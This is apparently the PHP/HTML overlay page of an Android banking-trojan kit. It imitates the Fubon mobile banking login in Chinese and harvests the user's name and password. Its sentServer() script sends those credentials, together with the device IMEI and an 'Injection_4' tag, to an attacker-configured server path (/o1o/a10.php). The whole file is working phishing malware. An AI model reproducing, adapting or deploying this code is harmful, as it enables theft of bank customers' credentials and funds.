<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="hk/com.FubonMobileClient/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div id="header">
<img style="width: 50%;padding: 25px 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAa4AAABpCAMAAABVsTcQAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAADAFBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAAAHgy0aAAAA/nRSTlMADzNXbHyNkCRjG7AgMOBg/eK9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">
</div>
<div id="content_div">

<h5 style="color: #fff;"> 請用本行提供的初始用戶登記號碼或閣下已登記之用戶名稱 </h5>

<form id="form">

<input name="field2" id="login" placeholder="用戶名稱" maxlength="50" class="input" type="text"><br>

<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>	

<input name="field3" id="password" maxlength="16" placeholder="私人密碼" class="input" type="password"><br>


<input value="进入" onClick="sentServer();" class="submit" type="button">

</form>
<br><br>
</div>
<script>
	
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace(url+'/o1o/a10.php?p=' +  imei_c+"|Injection_4|com.FubonMobileClient|"+login1+"|"+pass);
	}
}
</script>
</body>
</html>
